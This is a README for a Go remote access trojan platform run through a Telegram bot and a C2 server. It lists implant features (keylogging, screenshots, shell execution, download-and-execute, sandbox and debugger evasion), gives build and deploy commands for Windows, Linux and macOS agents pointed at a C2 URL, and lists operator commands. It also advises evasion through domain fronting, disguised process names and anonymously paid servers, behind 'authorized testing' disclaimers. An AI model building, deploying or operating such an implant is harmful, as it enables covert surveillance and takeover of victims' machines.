# 🔴 RAT-as-a-Service (RaaS) Platform

**Professional Remote Access Trojan Platform for Authorized Penetration Testing**

![RAT Platform](https://img.shields.io/badge/Platform-RAT--as--a--Service-red?style=for-the-badge)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-orange?style=for-the-badge)

## 🚨 **LEGAL WARNING**

This software is intended **EXCLUSIVELY** for:
- ✅ Authorized penetration testing
- ✅ Security research in controlled environments  
- ✅ Educational cybersecurity purposes
- ✅ Red team exercises with proper authorization

**❌ DO NOT USE FOR:**
- Unauthorized computer access
- Malicious activities
- Any illegal purposes

Users are fully responsible for compliance with applicable laws.

## 🏗️ **Architecture Overview**

The RAT-as-a-Service platform consists of three main components:

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│  📱 Telegram    │    │   🌐 C2 Server   │    │  🤖 RAT Agent   │
│      Bot        │◄──►│   (Relay Hub)    │◄──►│   (Implant)     │
│  (Controller)   │    │                  │    │                 │
└─────────────────┘    └──────────────────┘    └─────────────────┘
      │                          │                        │
      │                          │                        │
   Operator                 Task Queue              Target System
   Interface             & Agent Manager           (Windows/Linux)
```

### 📱 **Telegram Bot Controller**
- **Purpose**: Operator command interface
- **Features**: 
  - Real-time agent management
  - Task scheduling and execution
  - Result monitoring
  - Superadmin authorization (ID: `7991166259`)

### 🌐 **C2 Server (Relay Engine)**
- **Purpose**: Communication hub between operators and agents
- **Features**:
  - Agent registration & health monitoring
  - Task distribution & result collection
  - RESTful API endpoints
  - Multi-agent session management

### 🤖 **RAT Agent (Implant)**
- **Purpose**: Persistent malware on target systems
- **Features**:
  - Anti-analysis & sandbox detection
  - Shell command execution
  - Screenshot capture
  - Keylogging capabilities
  - File download & execution
  - Encrypted beaconing with jitter

## 🚀 **Quick Start Guide**

### 1. **Prerequisites**

```bash
# Install Go 1.21+
go version

# Clone repository
git clone <repository-url>
cd rat-as-a-service
```

### 2. **Setup Telegram Bot**

1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Create new bot: `/newbot`
3. Follow prompts to get your bot token
4. Update `BOT_TOKEN` in `telegram-bot/bot.go`:

```go
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
```

### 3. **Install Dependencies**

```bash
go mod tidy
```

### 4. **Launch Platform**

```bash
# Full platform with all components
go run main.go -bot-token YOUR_BOT_TOKEN

# Or individual components
go run main.go -component c2          # C2 Server only
go run main.go -component bot         # Telegram Bot only
```

### 5. **Deploy RAT Agents**

```bash
# Build Windows agent
GOOS=windows GOARCH=amd64 go build -o agent.exe ./agent/

# Build Linux agent  
GOOS=linux GOARCH=amd64 go build -o agent ./agent/

# Deploy to target systems
./agent.exe                           # Windows
./agent http://your-c2-server:8080    # Custom C2 URL
```

## 🎮 **Telegram Bot Commands**

Once your bot is running, message it from user ID `7991166259`:

### 📊 **Agent Management**
```
/agents                    # List all registered agents
/select <agent_id>         # Select agent for operations  
/health                    # Show C2 server health status
```

### ⚡ **Agent Operations**
```
/shell <command>           # Execute shell command
/screenshot               # Capture screen
/keylog <seconds>         # Start keylogger for N seconds
/upload <url>             # Download & execute file
/terminate                # Terminate selected agent
```

### 📈 **System Commands**
```
/help                     # Show command menu
/start                    # Welcome message
```

### 🔍 **Example Usage**

```
/agents                           # List agents
/select a1b2c3d4                 # Select agent by ID
/shell whoami                    # Get current user
/shell dir C:\                   # List directory
/screenshot                      # Take screenshot
/keylog 60                       # Keylog for 60 seconds
/shell ipconfig /all             # Network configuration
```

## 🛠️ **Configuration**

### **Environment Variables**
```bash
export C2_HOST="0.0.0.0"
export C2_PORT="8080"
export BOT_TOKEN="your_bot_token"
```

### **Config File**: `config/config.go`
```go
const (
    C2_SERVER_HOST = "0.0.0.0"
    C2_SERVER_PORT = "8080"
    BEACON_INTERVAL = 30 * time.Second
    JITTER_PERCENTAGE = 25
    SUPERADMIN_ID = 7991166259
)
```

## 🔧 **Development**

### **Project Structure**
```
rat-as-a-service/
├── config/              # Shared configuration
│   └── config.go
├── c2-server/           # C2 communication server
│   └── server.go
├── telegram-bot/        # Telegram bot controller
│   └── bot.go
├── agent/               # RAT implant
│   └── agent.go
├── main.go              # Unified launcher
├── go.mod               # Dependencies
└── README.md            # Documentation
```

### **Build Options**

```bash
# Build all components
go build -o raas-platform main.go

# Build agent for different platforms
GOOS=windows GOARCH=amd64 go build -o agent-win.exe ./agent/
GOOS=linux GOARCH=amd64 go build -o agent-linux ./agent/
GOOS=darwin GOARCH=amd64 go build -o agent-macos ./agent/

# Build with reduced binary size
go build -ldflags="-s -w" -o agent.exe ./agent/
```

### **Testing**

```bash
# Test C2 server health
curl http://localhost:8080/health

# Test agent registration
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"hostname":"test","username":"user","os":"windows"}'
```

## 🛡️ **Security Features**

### **Anti-Analysis (Agent)**
- ✅ Debugger detection (`IsDebuggerPresent`)
- ✅ Sandbox timing checks
- ✅ VM detection (CPU cores, screen resolution)
- ✅ Random execution delays
- ✅ Jittered beaconing intervals

### **Communication Security**
- ✅ XOR encryption for payloads
- ✅ HTTPS support (configure TLS certificates)
- ✅ Custom User-Agent strings
- ✅ Domain fronting capabilities (configure proxy)

### **Operational Security**
- ✅ Telegram bot authorization (superadmin only)
- ✅ Agent session management
- ✅ Secure task distribution
- ✅ Result encryption

## 📡 **Deployment Scenarios**

### **Local Testing**
```bash
# Terminal 1: Start platform
go run main.go -bot-token YOUR_TOKEN

# Terminal 2: Run test agent
go run ./agent/agent.go
```

### **Remote C2 Server**
```bash
# Server machine
go run main.go -c2-host 0.0.0.0 -bot-token YOUR_TOKEN

# Agent deployment  
go run ./agent/agent.go http://your-server-ip:8080
```

### **Docker Deployment**
```dockerfile
FROM golang:1.21-alpine
WORKDIR /app
COPY . .
RUN go mod tidy
RUN go build -o raas main.go
EXPOSE 8080
CMD ["./raas", "-bot-token", "YOUR_TOKEN"]
```

## ⚠️ **Operational Considerations**

### **Detection Evasion**
- Deploy agents with random delays
- Use HTTPS with valid certificates  
- Implement domain fronting
- Vary beacon intervals with jitter
- Use legitimate-looking process names

### **Infrastructure Security**
- Use VPS with anonymous payment
- Configure proper firewall rules
- Enable logging for audit trails
- Implement proper backup procedures
- Use encrypted communication channels

### **Legal Compliance**
- Obtain written authorization before testing
- Document all activities for reporting
- Respect scope limitations
- Follow responsible disclosure practices
- Maintain evidence custody chains

## 🐛 **Troubleshooting**

### **Common Issues**

**Agent Not Connecting**
```bash
# Check C2 server status
curl http://localhost:8080/health

# Verify firewall rules
netstat -an | grep 8080

# Check agent logs
go run ./agent/agent.go
```

**Telegram Bot Not Responding**
```bash
# Verify bot token
# Check superadmin ID (7991166259)
# Confirm bot is started: "Telegram Bot started"
```

**Tasks Not Executing**
```bash
# Check agent beaconing
# Verify task queue: /health command
# Check agent logs for errors
```

## 📚 **Resources**

- [Go Documentation](https://golang.org/doc/)
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [Windows API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Penetration Testing Frameworks](https://www.ptes.org/)

## 🤝 **Contributing**

This is an educational project. Contributions should:
- Enhance educational value
- Improve security research capabilities
- Follow responsible disclosure practices
- Include proper documentation

## 📄 **License**

This project is for **educational and authorized testing purposes only**. 

By using this software, you agree to:
- Use only for legitimate security testing
- Obtain proper authorization before deployment
- Comply with all applicable laws and regulations
- Take full responsibility for your actions

---

**⚠️ Remember: With great power comes great responsibility. Use this platform ethically and legally.** 